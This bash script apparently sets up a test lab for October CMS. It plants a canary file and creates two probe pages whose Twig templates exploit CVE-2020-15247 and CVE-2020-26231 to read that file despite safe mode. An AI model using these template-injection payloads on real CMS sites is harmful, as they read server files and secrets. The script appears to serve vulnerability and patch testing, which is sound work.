#!/bin/bash
set -e

# ---- Plant the PCB canary outside the webroot ----
printf '%s' "${PCB_FLAG:?set PCB_FLAG to the per-run canary token}" > /var/canary.txt
chmod 644 /var/canary.txt

# ---- Wait for MySQL ----
echo "[entrypoint] Waiting for MySQL at ${DB_HOST}..."
until php -r "try { new PDO('mysql:host='.\$_SERVER['DB_HOST'].';port=3306;dbname='.\$_SERVER['DB_DATABASE'], \$_SERVER['DB_USERNAME'], \$_SERVER['DB_PASSWORD']); echo 'ok'; } catch(Exception \$e) { exit(1); }" 2>/dev/null; do
    sleep 2
done
echo "[entrypoint] MySQL is ready."

# ---- Configure database via .env ----
cat > /var/www/html/.env <<ENVEOF
APP_DEBUG=true
APP_URL=http://localhost
APP_KEY=$(php -r "echo 'base64:'.base64_encode(random_bytes(32));")

DB_CONNECTION=mysql
DB_HOST=${DB_HOST}
DB_PORT=3306
DB_DATABASE=${DB_DATABASE}
DB_USERNAME=${DB_USERNAME}
DB_PASSWORD=${DB_PASSWORD}

CMS_SAFE_MODE=true
ENVEOF

# ---- Force database config to use env vars (TCP connection) ----
cat > /var/www/html/config/database.php <<'DBEOF'
<?php
return [
    'default' => 'mysql',
    'connections' => [
        'mysql' => [
            'driver'    => 'mysql',
            'host'      => env('DB_HOST', '127.0.0.1'),
            'port'      => env('DB_PORT', 3306),
            'database'  => env('DB_DATABASE', 'october'),
            'username'  => env('DB_USERNAME', 'october'),
            'password'  => env('DB_PASSWORD', ''),
            'charset'   => 'utf8mb4',
            'collation' => 'utf8mb4_unicode_ci',
            'prefix'    => '',
        ],
        'sqlite' => [
            'driver'   => 'sqlite',
            'database' => storage_path('database.sqlite'),
            'prefix'   => '',
        ],
    ],
    'migrations' => 'migrations',
    'redis' => [],
];
DBEOF

# ---- Also set safe mode in config/cms.php ----
if grep -q "'enableSafeMode'" /var/www/html/config/cms.php 2>/dev/null; then
    sed -i "s/'enableSafeMode'.*=>.*false/'enableSafeMode' => true/" /var/www/html/config/cms.php
fi

# ---- Run database migrations (install) ----
cd /var/www/html
php artisan key:generate --force 2>/dev/null || true
php artisan october:up --no-interaction 2>&1 || {
    echo "[entrypoint] october:up failed (exit $?), continuing anyway..."
}

# ---- Create CMS pages for the canary probes ----
# October CMS v1.0.x default theme is "demo"; pages are .htm files
THEME_DIR="/var/www/html/themes/demo/pages"
mkdir -p "$THEME_DIR"

# Original probe page (CVE-2020-15247 -- uses addDynamicMethod)
cat > "$THEME_DIR/canary-original.htm" <<'PAGEEOF'
title = "Canary Original"
url = "/canary-original"
==
{{ this.page.addDynamicMethod('readCanary', 'file_get_contents') }}{{ this.page.readCanary('/var/canary.txt') }}
PAGEEOF

# Bypass probe page (CVE-2020-26231 -- uses bindEvent + fireEvent)
cat > "$THEME_DIR/canary-bypass.htm" <<'PAGEEOF'
title = "Canary Bypass"
url = "/canary-bypass"
==
{% set _bind = this.page.bindEvent('pcb.read', 'file_get_contents') %}{{ this.page.fireEvent('pcb.read', ['/var/canary.txt'])|join }}
PAGEEOF

chown -R www-data:www-data /var/www/html/themes

echo "[entrypoint] October CMS ready. Safe mode: enabled. Canary planted."
exec apache2-foreground
